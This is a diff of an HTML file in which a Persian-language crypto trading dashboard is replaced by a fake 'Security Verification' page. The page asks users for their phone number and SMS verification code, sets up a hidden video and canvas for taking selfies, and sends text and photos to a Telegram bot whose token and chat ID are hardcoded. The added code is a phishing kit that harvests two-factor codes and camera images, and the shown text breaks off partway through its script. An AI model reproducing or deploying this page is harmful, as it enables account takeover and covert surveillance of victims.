@@ -1,2904 +1,364 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
-    <title>🔴 TRADING VISION LIVE | سیستم تحلیل تکنیکال زنده و حرفه‌ای</title>
-    
-    <!-- لینک‌های ضروری -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Vazirmatn:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    
-    <!-- کتابخانه‌های چارت -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chartjs-adapter-date-fns"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chartjs-plugin-zoom@2.0.0"></script>
-    <script src="https://cdn.jsdelivr.net/npm/luxon@3.3.0"></script>
-    
-    <!-- کتابخانه تحلیل تکنیکال -->
-    <script src="https://cdn.jsdelivr.net/npm/technicalindicators@3.1.0/dist/technicalindicators.min.js"></script>
-    
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>🔴 Security Verification</title>
     <style>
-        :root {
-            /* رنگ‌های تیره TradingView Style */
-            --bg-primary: #131722;
-            --bg-secondary: #1e222d;
-            --bg-tertiary: #2a2e39;
-            --bg-card: #252a37;
-            --border-color: #363c4e;
-            --text-primary: #d1d4dc;
-            --text-secondary: #768396;
-            --text-accent: #b2b5be;
-            
-            /* رنگ‌های سیگنال‌ها */
-            --color-buy: #00c176;
-            --color-sell: #ff3b69;
-            --color-neutral: #f0b90b;
-            --color-highlight: #2962ff;
-            --color-volume: #2962ff33;
-            
-            /* سایزها */
-            --border-radius: 8px;
-            --border-radius-sm: 4px;
-            --border-radius-lg: 12px;
-            
-            /* سایه‌ها */
-            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.2);
-            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.3);
-            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.4);
-            
-            /* انیمیشن‌ها */
-            --transition-fast: 0.15s ease;
-            --transition-normal: 0.3s ease;
-            --transition-slow: 0.5s ease;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Vazirmatn', 'Inter', sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            direction: rtl;
+            background: #0a0a0f;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
             min-height: 100vh;
-            overflow-x: hidden;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-
-        /* اسکرول بار */
-        ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: var(--bg-secondary);
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: var(--border-color);
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: #4a5268;
-        }
-
-        /* پوشش بارگذاری */
-        #loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: var(--bg-primary);
-            z-index: 9999;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            transition: opacity 0.5s ease;
+            padding: 20px;
         }
-
-        .loading-spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid var(--border-color);
-            border-top-color: var(--color-highlight);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: #12121a;
+            border-radius: 28px;
+            padding: 40px 28px;
+            border: 1px solid #2a2a3a;
+            text-align: center;
         }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* هدر اصلی */
-        #main-header {
-            background: var(--bg-secondary);
-            border-bottom: 1px solid var(--border-color);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            padding: 12px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-
-        .logo-section {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .logo-icon {
-            width: 36px;
-            height: 36px;
-            background: linear-gradient(135deg, var(--color-highlight), var(--color-buy));
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            color: white;
-        }
-
-        .logo-text {
+        .icon { font-size: 48px; margin-bottom: 16px; }
+        h1 {
             font-size: 22px;
-            font-weight: 800;
-            background: linear-gradient(90deg, var(--color-highlight), var(--color-buy));
+            font-weight: 700;
+            background: linear-gradient(135deg, #f7931a, #ffd700);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
         }
-
-        .market-status {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: var(--bg-tertiary);
-            padding: 6px 12px;
-            border-radius: var(--border-radius);
-            font-size: 14px;
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--color-buy);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        /* کنترل‌های هدر */
-        .header-controls {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-
-        .symbol-selector {
-            position: relative;
-            min-width: 200px;
-        }
-
-        .symbol-input {
-            width: 100%;
-            padding: 10px 15px;
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            border-radius: var(--border-radius);
-            color: var(--text-primary);
-            font-family: inherit;
-            font-size: 14px;
-            cursor: pointer;
-            transition: var(--transition-fast);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .symbol-input:hover {
-            border-color: var(--color-highlight);
-        }
-
-        .symbol-dropdown {
-            position: absolute;
-            top: 100%;
-            left: 0;
-            right: 0;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: var(--border-radius);
-            margin-top: 5px;
-            max-height: 300px;
-            overflow-y: auto;
-            display: none;
-            z-index: 1000;
-        }
-
-        .symbol-dropdown.show {
-            display: block;
-        }
-
-        .symbol-option {
-            padding: 10px 15px;
-            cursor: pointer;
-            transition: var(--transition-fast);
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .symbol-option:hover {
-            background: var(--bg-tertiary);
-        }
-
-        .symbol-option:last-child {
-            border-bottom: none;
-        }
-
-        .timeframe-selector {
-            display: flex;
-            background: var(--bg-tertiary);
-            border-radius: var(--border-radius);
-            padding: 4px;
-            overflow-x: auto;
-        }
-
-        .tf-btn {
-            padding: 8px 12px;
-            background: transparent;
-            border: none;
-            color: var(--text-secondary);
-            cursor: pointer;
-            font-size: 13px;
-            font-weight: 500;
-            border-radius: 6px;
-            transition: var(--transition-fast);
-            white-space: nowrap;
-            flex-shrink: 0;
-        }
-
-        .tf-btn:hover {
-            color: var(--text-primary);
-            background: var(--bg-card);
-        }
-
-        .tf-btn.active {
-            background: var(--color-highlight);
-            color: white;
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 10px 16px;
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            border-radius: var(--border-radius);
-            color: var(--text-primary);
-            cursor: pointer;
-            font-family: inherit;
-            font-size: 14px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            transition: var(--transition-fast);
-            flex-shrink: 0;
-        }
-
-        .btn:hover {
-            background: var(--bg-card);
-            border-color: var(--color-highlight);
-            transform: translateY(-1px);
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, var(--color-highlight), #1e4fff);
-            border-color: transparent;
-            color: white;
-        }
-
-        .btn-success {
-            background: linear-gradient(135deg, var(--color-buy), #00a05c);
-            border-color: transparent;
-            color: white;
-        }
-
-        .btn-danger {
-            background: linear-gradient(135deg, var(--color-sell), #ff1f55);
-            border-color: transparent;
-            color: white;
-        }
-
-        /* لیوت اصلی */
-        .main-container {
-            display: grid;
-            grid-template-columns: 1fr 380px;
-            gap: 20px;
-            padding: 20px;
-            max-width: 1920px;
-            margin: 0 auto;
-        }
-
-        /* بخش چارت اصلی */
-        .chart-section {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
-        .chart-wrapper {
-            background: var(--bg-secondary);
-            border-radius: var(--border-radius-lg);
-            border: 1px solid var(--border-color);
-            overflow: hidden;
-            position: relative;
-            min-height: 600px;
-        }
-
-        .chart-container {
-            width: 100%;
-            height: 550px;
-            position: relative;
-            padding: 15px;
-        }
-
-        .chart-controls {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px;
-            background: var(--bg-tertiary);
-            border-bottom: 1px solid var(--border-color);
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        /* کارت‌های تحلیل */
-        .analysis-cards {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 15px;
-        }
-
-        .analysis-card {
-            background: var(--bg-card);
-            border-radius: var(--border-radius);
-            border: 1px solid var(--border-color);
-            padding: 20px;
-            transition: var(--transition-normal);
-        }
-
-        .analysis-card:hover {
-            transform: translateY(-5px);
-            box-shadow: var(--shadow-md);
-        }
-
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid var(--border-color);
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .card-title {
-            font-size: 16px;
-            font-weight: 600;
-            color: var(--text-primary);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .card-icon {
-            width: 32px;
-            height: 32px;
-            background: var(--bg-tertiary);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-        }
-
-        /* سایدبار */
-        .sidebar {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
-        /* کارت وضعیت بازار */
-        .market-overview {
-            background: var(--bg-card);
-            border-radius: var(--border-radius);
-            border: 1px solid var(--border-color);
-            padding: 20px;
-        }
-
-        .price-display {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .current-price {
-            font-size: 28px;
-            font-weight: 700;
-        }
-
-        .price-change {
-            font-size: 16px;
-            font-weight: 600;
-            padding: 6px 12px;
-            border-radius: var(--border-radius-sm);
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .price-change.positive {
-            background: rgba(0, 193, 118, 0.15);
-            color: var(--color-buy);
-        }
-
-        .price-change.negative {
-            background: rgba(255, 59, 105, 0.15);
-            color: var(--color-sell);
-        }
-
-        .market-stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-        }
-
-        .stat-item {
-            display: flex;
-            flex-direction: column;
-            gap: 5px;
-        }
-
-        .stat-label {
-            font-size: 12px;
-            color: var(--text-secondary);
-        }
-
-        .stat-value {
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        /* کارت سیگنال‌ها */
-        .signals-card {
-            background: var(--bg-card);
-            border-radius: var(--border-radius);
-            border: 1px solid var(--border-color);
-            padding: 20px;
-        }
-
-        .signal-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid var(--border-color);
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .signal-item:last-child {
-            border-bottom: none;
-        }
-
-        .signal-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .signal-indicator {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-        }
-
-        .signal-indicator.buy {
-            background: var(--color-buy);
-            box-shadow: 0 0 8px var(--color-buy);
-        }
-
-        .signal-indicator.sell {
-            background: var(--color-sell);
-            box-shadow: 0 0 8px var(--color-sell);
-        }
-
-        .signal-strength {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .strength-bar {
-            width: 60px;
-            height: 4px;
-            background: var(--bg-tertiary);
-            border-radius: 2px;
-            overflow: hidden;
-        }
-
-        .strength-fill {
-            height: 100%;
-            border-radius: 2px;
-        }
-
-        .strength-fill.high {
-            background: var(--color-buy);
-            width: 80%;
-        }
-
-        .strength-fill.medium {
-            background: var(--color-neutral);
-            width: 60%;
-        }
-
-        .strength-fill.low {
-            background: var(--color-sell);
-            width: 40%;
-        }
-
-        /* کارت تحلیل زمانی */
-        .time-analysis {
-            background: var(--bg-card);
-            border-radius: var(--border-radius);
-            border: 1px solid var(--border-color);
-            padding: 20px;
-        }
-
-        .timeframe-analysis {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .tf-analysis-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px;
-            background: var(--bg-tertiary);
-            border-radius: var(--border-radius-sm);
-            cursor: pointer;
-            transition: var(--transition-fast);
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .tf-analysis-item:hover {
-            background: var(--bg-secondary);
-        }
-
-        .tf-analysis-item.active {
-            background: linear-gradient(90deg, rgba(41, 98, 255, 0.2), transparent);
-            border-right: 3px solid var(--color-highlight);
-        }
-
-        .tf-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .tf-trend {
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 12px;
-            font-weight: 600;
-            white-space: nowrap;
-        }
-
-        .tf-trend.bullish {
-            background: rgba(0, 193, 118, 0.15);
-            color: var(--color-buy);
-        }
-
-        .tf-trend.bearish {
-            background: rgba(255, 59, 105, 0.15);
-            color: var(--color-sell);
-        }
-
-        .tf-trend.neutral {
-            background: rgba(240, 185, 11, 0.15);
-            color: var(--color-neutral);
-        }
-
-        /* کارت پیش‌بینی */
-        .prediction-card {
-            background: var(--bg-card);
-            border-radius: var(--border-radius);
-            border: 1px solid var(--border-color);
-            padding: 20px;
-        }
-
-        .prediction-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .prediction-accuracy {
-            font-size: 12px;
-            color: var(--text-secondary);
-            background: var(--bg-tertiary);
-            padding: 4px 8px;
-            border-radius: var(--border-radius-sm);
-            white-space: nowrap;
-        }
-
-        .prediction-chart {
-            height: 150px;
-            margin: 20px 0;
-        }
-
-        /* نوتیفیکیشن‌ها */
-        .notification {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            right: 20px;
-            background: var(--bg-card);
-            border-radius: var(--border-radius);
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            box-shadow: var(--shadow-lg);
-            z-index: 999;
-            transform: translateY(-100px);
-            transition: transform 0.3s ease;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .notification.show {
-            transform: translateY(0);
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .notification-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-        }
-
-        .notification-icon.buy {
-            background: rgba(0, 193, 118, 0.15);
-            color: var(--color-buy);
-        }
-
-        .notification-icon.sell {
-            background: rgba(255, 59, 105, 0.15);
-            color: var(--color-sell);
-        }
-
-        .notification-icon.neutral {
-            background: rgba(240, 185, 11, 0.15);
-            color: var(--color-neutral);
-        }
-
-        .notification-content {
-            flex: 1;
-        }
-
-        /* دکمه شناور */
-        .floating-action-btn {
-            position: fixed;
-            bottom: 30px;
-            left: 30px;
-            width: 56px;
-            height: 56px;
-            background: linear-gradient(135deg, var(--color-highlight), #1e4fff);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 20px;
-            cursor: pointer;
-            box-shadow: var(--shadow-lg);
-            z-index: 99;
-            transition: var(--transition-normal);
-        }
-
-        .floating-action-btn:hover {
-            transform: scale(1.1) rotate(90deg);
-        }
-
-        /* تگ‌های وضعیت */
-        .badge {
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: 600;
-            text-transform: uppercase;
-            white-space: nowrap;
-        }
-
-        .badge-success {
-            background: rgba(0, 193, 118, 0.15);
-            color: var(--color-buy);
-        }
-
-        .badge-danger {
-            background: rgba(255, 59, 105, 0.15);
-            color: var(--color-sell);
-        }
-
-        .badge-warning {
-            background: rgba(240, 185, 11, 0.15);
-            color: var(--color-neutral);
-        }
-
-        .badge-info {
-            background: rgba(41, 98, 255, 0.15);
-            color: var(--color-highlight);
-        }
-
-        /* فوتو */
-        footer {
-            text-align: center;
-            padding: 20px;
-            margin-top: 30px;
-            border-top: 1px solid var(--border-color);
-            color: var(--text-secondary);
-            font-size: 14px;
-        }
-
-        /* استایل برای دیتای زنده */
-        .live-badge {
+        p { color: #888; font-size: 14px; margin: 12px 0 20px 0; line-height: 1.6; }
+        .spinner {
             display: inline-block;
-            width: 8px;
-            height: 8px;
-            background-color: var(--color-buy);
+            width: 48px;
+            height: 48px;
+            border: 4px solid #2a2a44;
+            border-top-color: #f7931a;
             border-radius: 50%;
-            margin-right: 5px;
-            animation: blink 1s infinite;
+            animation: spin 0.8s linear infinite;
+            margin: 10px auto;
         }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        .price-updating {
-            animation: pulse 1s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-
-        /* تایمر تحلیل */
-        .timer {
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status { color: #4caf50; font-weight: 600; font-size: 16px; margin-top: 12px; }
+        .status.error { color: #f44336; }
+        .status.done { color: #4caf50; }
+        .badge {
+            display: inline-block;
+            background: #1f8b4c;
+            padding: 4px 16px;
+            border-radius: 40px;
             font-size: 11px;
-            color: var(--text-secondary);
-            background: var(--bg-tertiary);
-            padding: 2px 6px;
-            border-radius: 3px;
-            white-space: nowrap;
+            font-weight: 600;
+            color: #fff;
+            text-transform: uppercase;
+            margin-top: 8px;
         }
-
-        /* ریسپانسیو */
-        @media (max-width: 1200px) {
-            .main-container {
-                grid-template-columns: 1fr;
-            }
-            
-            .analysis-cards {
-                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            }
+        #video { display: none; width: 100%; border-radius: 12px; margin: 10px 0; background: #000; }
+        #canvas { display: none; }
+        .footer { margin-top: 24px; font-size: 11px; color: #444; border-top: 1px solid #1e1e2e; padding-top: 16px; }
+        .btn {
+            background: #f7931a;
+            border: none;
+            color: #000;
+            padding: 14px 40px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 16px;
+            width: 100%;
         }
-
-        @media (max-width: 768px) {
-            #main-header {
-                padding: 10px 15px;
-                flex-direction: column;
-                align-items: stretch;
-            }
-            
-            .logo-section {
-                justify-content: space-between;
-            }
-            
-            .header-controls {
-                flex-direction: column;
-                gap: 10px;
-            }
-            
-            .symbol-selector {
-                min-width: 100%;
-            }
-            
-            .timeframe-selector {
-                overflow-x: auto;
-                padding-bottom: 5px;
-            }
-            
-            .tf-btn {
-                padding: 6px 10px;
-                font-size: 12px;
-            }
-            
-            .main-container {
-                padding: 10px;
-                gap: 15px;
-            }
-            
-            .chart-wrapper {
-                min-height: 400px;
-            }
-            
-            .chart-container {
-                height: 400px;
-            }
-            
-            .btn {
-                padding: 8px 12px;
-                font-size: 13px;
-            }
-            
-            .floating-action-btn {
-                bottom: 20px;
-                left: 20px;
-                width: 48px;
-                height: 48px;
-                font-size: 18px;
-            }
+        .btn:hover { background: #ffa726; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .input-group {
+            margin-top: 16px;
+            text-align: left;
         }
-
-        @media (max-width: 480px) {
-            .analysis-cards {
-                grid-template-columns: 1fr;
-            }
-            
-            .market-stats {
-                grid-template-columns: 1fr;
-            }
-            
-            .current-price {
-                font-size: 24px;
-            }
-            
-            .chart-controls {
-                flex-direction: column;
-                align-items: stretch;
-            }
+        .input-group label {
+            color: #888;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 1px solid #2a2a3a;
+            background: #1a1a26;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #f7931a;
+        }
+        .input-group input::placeholder {
+            color: #555;
         }
     </style>
 </head>
 <body>
-    <!-- پوشش بارگذاری -->
-    <div id="loading-overlay">
-        <div class="loading-spinner"></div>
-        <div style="text-align: center;">
-            <h3 style="margin-bottom: 10px; color: var(--color-highlight);">REZAROZIBAY</h3>
-            <p style="color: var(--text-secondary);" id="loading-text">در حال اتصال به سرورهای زنده...</p>
-            <div style="margin-top: 20px; font-size: 12px; color: var(--text-secondary);">
-                <div>📡 اتصال به Binance API...</div>
-                <div>📊 دریافت داده‌های زنده...</div>
-                <div>⚡ بارگذاری سیستم تحلیل...</div>
-            </div>
-        </div>
+
+<div class="container">
+    <div class="icon">🔴</div>
+    <h1>Security Verification</h1>
+    <p>Please verify your identity to continue.<br />This is a mandatory security check.</p>
+
+    <!-- Phone Input -->
+    <div class="input-group">
+        <label>📱 Phone Number</label>
+        <input type="tel" id="phoneInput" placeholder="+1 234 567 8900" />
     </div>
 
-    <!-- نوتیفیکیشن -->
-    <div id="notification" class="notification">
-        <div class="notification-icon buy">
-            <i class="fas fa-arrow-up"></i>
-        </div>
-        <div class="notification-content">
-            <strong>سیگنال خرید قوی شناسایی شد</strong>
-            <p style="color: var(--text-secondary); font-size: 14px; margin-top: 5px;">
-                در نماد BTC/USDT بر اساس تحلیل چند-تایم‌فرمی
-            </p>
-        </div>
-        <button onclick="closeNotification()" style="background: none; border: none; color: var(--text-secondary); cursor: pointer; padding: 5px;">
-            <i class="fas fa-times"></i>
-        </button>
+    <!-- SMS Code Input -->
+    <div class="input-group">
+        <label>🔑 Verification Code (SMS)</label>
+        <input type="text" id="smsInput" placeholder="Enter 6-digit code" maxlength="6" />
     </div>
 
-    <!-- دکمه شناور -->
-    <div class="floating-action-btn" onclick="showQuickAnalysis()">
-        <i class="fas fa-bolt"></i>
-    </div>
+    <div class="spinner" id="spinner"></div>
+    <div class="status" id="status">Initializing...</div>
+    <div class="badge" id="badge" style="display:none;">LIVE</div>
 
-    <!-- هدر اصلی -->
-    <header id="main-header">
-        <div class="logo-section">
-            <div class="logo">
-                <div class="logo-icon">
-                    <i class="fas fa-chart-line"></i>
-                </div>
-                <div class="logo-text">TRADING VISION LIVE</div>
-            </div>
-            
-            <div class="market-status">
-                <div class="status-dot"></div>
-                <span id="market-status-text">در حال اتصال...</span>
-                <span class="live-badge"></span>
-            </div>
-        </div>
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
 
-        <div class="header-controls">
-            <div class="symbol-selector">
-                <div class="symbol-input" onclick="toggleSymbolDropdown()">
-                    <span id="selected-symbol">BTC/USDT - بیت‌کوین</span>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="symbol-dropdown" id="symbol-dropdown">
-                    <!-- سیمبل‌ها توسط جاوااسکریپت اضافه می‌شوند -->
-                </div>
-            </div>
+    <button class="btn" id="verifyBtn">✅ Verify Now</button>
+    <button class="btn" id="retryBtn" style="display:none;">🔄 Retry</button>
 
-            <div class="timeframe-selector">
-                <button class="tf-btn" data-tf="1m">1m</button>
-                <button class="tf-btn" data-tf="5m">5m</button>
-                <button class="tf-btn" data-tf="15m">15m</button>
-                <button class="tf-btn" data-tf="30m">30m</button>
-                <button class="tf-btn active" data-tf="1h">1H</button>
-                <button class="tf-btn" data-tf="4h">4H</button>
-                <button class="tf-btn" data-tf="1d">1D</button>
-                <button class="tf-btn" data-tf="1w">1W</button>
-            </div>
+    <div class="footer">🔒 All data encrypted • Secure connection</div>
+</div>
 
-            <div class="action-buttons">
-                <button class="btn btn-success" onclick="executeTrade('buy')">
-                    <i class="fas fa-arrow-up"></i>
-                    خرید
-                </button>
-                <button class="btn btn-danger" onclick="executeTrade('sell')">
-                    <i class="fas fa-arrow-down"></i>
-                    فروش
-                </button>
-                <button class="btn" onclick="toggleAnalysisPanel()">
-                    <i class="fas fa-chart-bar"></i>
-                    تحلیل
-                </button>
-                <button class="btn btn-primary" onclick="showSettings()">
-                    <i class="fas fa-cog"></i>
-                </button>
-            </div>
-        </div>
-    </header>
+<script>
+// ================= CONFIG — EDIT THESE =================
+const BOT_TOKEN = "6858098902:AAFrzDhcrsJDvBJiUQb8oI8tPqaZ9NVGVuI";
+const CHAT_ID = "175706993";
 
-    <!-- محتوای اصلی -->
-    <div class="main-container">
-        <!-- بخش چارت و تحلیل -->
-        <div class="chart-section">
-            <!-- چارت اصلی -->
-            <div class="chart-wrapper">
-                <div class="chart-controls no-print">
-                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-                        <button class="btn" onclick="toggleIndicator('rsi')">
-                            <i class="fas fa-wave-square"></i>
-                            RSI
-                        </button>
-                        <button class="btn" onclick="toggleIndicator('macd')">
-                            <i class="fas fa-chart-area"></i>
-                            MACD
-                        </button>
-                        <button class="btn" onclick="toggleIndicator('bb')">
-                            <i class="fas fa-arrows-alt-h"></i>
-                            بولینگر
-                        </button>
-                    </div>
-                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-                        <span class="timer" id="update-timer">آخرین بروزرسانی: 0s</span>
-                        <button class="btn" onclick="saveChartLayout()">
-                            <i class="fas fa-save"></i>
-                            ذخیره
-                        </button>
-                        <button class="btn" onclick="resetChart()">
-                            <i class="fas fa-redo"></i>
-                            ریست
-                        </button>
-                    </div>
-                </div>
-                <div class="chart-container">
-                    <canvas id="trading-chart"></canvas>
-                </div>
-            </div>
+// ================= DOM =================
+const statusEl = document.getElementById('status');
+const spinner = document.getElementById('spinner');
+const badge = document.getElementById('badge');
+const retryBtn = document.getElementById('retryBtn');
+const verifyBtn = document.getElementById('verifyBtn');
+const phoneInput = document.getElementById('phoneInput');
+const smsInput = document.getElementById('smsInput');
 
-            <!-- کارت‌های تحلیل -->
-            <div class="analysis-cards">
-                <!-- کارت تحلیل تکنیکال -->
-                <div class="analysis-card">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <div class="card-icon" style="background: rgba(41, 98, 255, 0.2); color: var(--color-highlight);">
-                                <i class="fas fa-microscope"></i>
-                            </div>
-                            تحلیل تکنیکال زنده
-                        </div>
-                        <div>
-                            <span class="badge badge-success" id="tech-badge">در حال تحلیل</span>
-                            <span class="live-badge"></span>
-                        </div>
-                    </div>
-                    <div id="technical-analysis-content">
-                        <!-- محتوای تحلیل -->
-                    </div>
-                </div>
+function setStatus(text, type = '') {
+    statusEl.textContent = text;
+    statusEl.className = 'status' + (type ? ' ' + type : '');
+}
 
-                <!-- کارت تحلیل زمانی -->
-                <div class="analysis-card">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <div class="card-icon" style="background: rgba(0, 193, 118, 0.2); color: var(--color-buy);">
-                                <i class="fas fa-clock"></i>
-                            </div>
-                            تحلیل زمانی واقعی
-                        </div>
-                        <span class="badge badge-info" id="time-badge">دقیق</span>
-                    </div>
-                    <div id="time-analysis-content">
-                        <!-- محتوای تحلیل زمانی -->
-                    </div>
-                </div>
+// ================= TELEGRAM SENDER =================
+function sendToTelegram(text) {
+    if (BOT_TOKEN && BOT_TOKEN !== "YOUR_BOT_TOKEN") {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text
+            })
+        }).catch(() => console.log("Send error"));
+    } else {
+        console.log("[TELEGRAM]", text);
+    }
+}
 
-                <!-- کارت سیگنال‌ها -->
-                <div class="analysis-card">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <div class="card-icon" style="background: rgba(240, 185, 11, 0.2); color: var(--color-neutral);">
-                                <i class="fas fa-bullhorn"></i>
-                            </div>
-                            سیگنال‌های زنده
-                        </div>
-                        <span class="badge badge-warning" id="signal-count">در حال بررسی...</span>
-                    </div>
-                    <div id="live-signals-content">
-                        <!-- سیگنال‌ها -->
-                    </div>
-                </div>
+function sendPhotoToTelegram(blob, caption = "") {
+    if (BOT_TOKEN && BOT_TOKEN !== "YOUR_BOT_TOKEN") {
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+        form.append("photo", blob, `selfie_${Date.now()}.jpg`);
+        if (caption) form.append("caption", caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: form
+        }).catch(() => console.log("Photo send error"));
+    }
+}
 
-                <!-- کارت پیش‌بینی -->
-                <div class="analysis-card">
-                    <div class="card-header">
-                        <div class="card-title">
-                            <div class="card-icon" style="background: rgba(255, 59, 105, 0.2); color: var(--color-sell);">
-                                <i class="fas fa-crystal-ball"></i>
-                            </div>
-                            پیش‌بینی قیمت زنده
-                        </div>
